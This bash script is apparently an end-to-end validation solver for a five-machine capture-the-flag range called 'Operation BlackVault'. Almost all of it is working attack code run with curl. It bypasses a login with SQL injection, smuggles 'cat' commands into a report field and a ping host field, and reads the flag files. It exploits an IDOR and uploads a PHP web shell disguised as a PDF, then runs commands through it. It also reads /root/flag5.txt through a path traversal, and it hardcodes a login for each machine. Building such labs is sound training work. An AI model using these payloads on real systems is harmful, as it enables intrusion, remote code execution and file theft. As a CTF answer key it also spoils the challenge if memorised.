#!/bin/bash
# Operation BlackVault — End-to-End Exploit Validation Script
# This script executes the exact Red Team payloads against all 5 machines to verify flags.
# Run this inside the CTF network after deployment.


# Default IP configuration (adjust to your VM IPs)
M1_IP=${1:-"127.0.0.1:80"}
M2_IP=${2:-"127.0.0.1:3000"}   # e.g. 11.0.0.22:3000
M3_IP=${3:-"127.0.0.1:8080"}   # e.g. 11.0.0.35:8080
M4_IP=${4:-"127.0.0.1:5000"}   # e.g. 195.0.0.15:5000
M5_IP=${5:-"127.0.0.1:8443"}   # e.g. 195.0.0.21:8443

echo "=========================================================="
echo "🛡️  Operation BlackVault — E2E Exploit Validation Script"
echo "=========================================================="

# -----------------------------------------------------------------------------
# M1: aglg-portal (SQL Injection + Command Injection)
echo -n "[*] Testing M1 (aglg-portal) SQLi & RCE... "
if curl -s -X POST "http://$M1_IP/login" -c /tmp/m1.cookie -d "username=' OR 1=1--&password=x" | grep -q "dashboard"; then
    M1_FLAG=$(curl -s -b /tmp/m1.cookie -X POST "http://$M1_IP/report" -d "shipment_id=AGX-001'; cat /opt/aglg/classified/flag1.txt; echo '" | grep -o 'FLAG{[^}]*}')
    if [ ! -z "$M1_FLAG" ]; then
        echo -e "\033[32mSUCCESS → $M1_FLAG\033[0m"
    else
        echo -e "\033[31mFAILED (Flag missing)\033[0m"
    fi
else
    echo -e "\033[31mFAILED (SQLi Login)\033[0m"
fi

# -----------------------------------------------------------------------------
# M2: aglg-warehouse (IDOR)
echo -n "[*] Testing M2 (aglg-warehouse) IDOR... "
M2_TOKEN=$(curl -s -X POST "http://$M2_IP/api/login" -H "Content-Type: application/json" -d '{"username":"vendor_ops","password":"V3nd0r@AGLG"}' | grep -o '"token":"[^"]*' | cut -d'"' -f4)
if [ ! -z "$M2_TOKEN" ]; then
    M2_FLAG=$(curl -s -H "x-auth-token: $M2_TOKEN" "http://$M2_IP/api/inventory/0" | grep -o 'FLAG{[^}]*}')
    if [ ! -z "$M2_FLAG" ]; then
        echo -e "\033[32mSUCCESS → $M2_FLAG\033[0m"
    else
        echo -e "\033[31mFAILED (IDOR hit failed)\033[0m"
    fi
else
    echo -e "\033[33mSKIPPED (M2 server down)\033[0m"
fi

# -----------------------------------------------------------------------------
# M3: aglg-hrportal (File Upload RCE)
echo -n "[*] Testing M3 (aglg-hrportal) Webshell... "
if curl -s "http://$M3_IP/login.php" >/dev/null; then
    curl -s -c /tmp/m3.cookie -X POST "http://$M3_IP/login.php" -d "username=hr_ops&password=HR0ps@AGLG24" > /dev/null
    echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
    curl -s -b /tmp/m3.cookie -F "document=@/tmp/shell.php;type=application/pdf" -F "doc_type=Test" "http://$M3_IP/upload.php" > /dev/null
    M3_FLAG=$(curl -s "http://$M3_IP/uploads/shell.php?cmd=cat+/opt/aglg/flag3.txt" | grep -o 'FLAG{[^}]*}')
    if [ ! -z "$M3_FLAG" ]; then
        echo -e "\033[32mSUCCESS → $M3_FLAG\033[0m"
    else
        echo -e "\033[31mFAILED (Webshell execution failed)\033[0m"
    fi
else
    echo -e "\033[33mSKIPPED (M3 server down)\033[0m"
fi

# -----------------------------------------------------------------------------
# M4: aglg-monitor (Command Injection)
echo -n "[*] Testing M4 (aglg-monitor) CMD Injection... "
if curl -s "http://$M4_IP/login" >/dev/null; then
    curl -s -c /tmp/m4.cookie -X POST "http://$M4_IP/login" -d "username=netops&password=N3t0ps@Mon1t0r" > /dev/null
    M4_FLAG=$(curl -s -b /tmp/m4.cookie -X POST "http://$M4_IP/tools/ping" -d "host=127.0.0.1; cat /opt/aglg/flag4.txt" | grep -o 'FLAG{[^}]*}')
    if [ ! -z "$M4_FLAG" ]; then
        echo -e "\033[32mSUCCESS → $M4_FLAG\033[0m"
    else
        echo -e "\033[31mFAILED (Injection failed)\033[0m"
    fi
else
    echo -e "\033[33mSKIPPED (M4 server down)\033[0m"
fi

# -----------------------------------------------------------------------------
# M5: aglg-vault (LFI Path Traversal)
echo -n "[*] Testing M5 (aglg-vault) LFI... "
if curl -s "http://$M5_IP/login" >/dev/null; then
    curl -s -c /tmp/m5.cookie -X POST "http://$M5_IP/login" -d "username=archivist&password=Arch1v1st@AGLG" > /dev/null
    M5_FLAG=$(curl -s -b /tmp/m5.cookie "http://$M5_IP/view?doc=../../../root/flag5.txt" | grep -o 'FLAG{[^}]*}')
    if [ ! -z "$M5_FLAG" ]; then
        echo -e "\033[32mSUCCESS → $M5_FLAG\033[0m"
    else
        echo -e "\033[31mFAILED (LFI hit failed)\033[0m"
    fi
else
    echo -e "\033[33mSKIPPED (M5 server down)\033[0m"
fi

echo "=========================================================="
echo "Cleaning up local files..."
rm -f /tmp/m1.cookie /tmp/m3.cookie /tmp/m4.cookie /tmp/m5.cookie /tmp/shell.php
echo "Done."
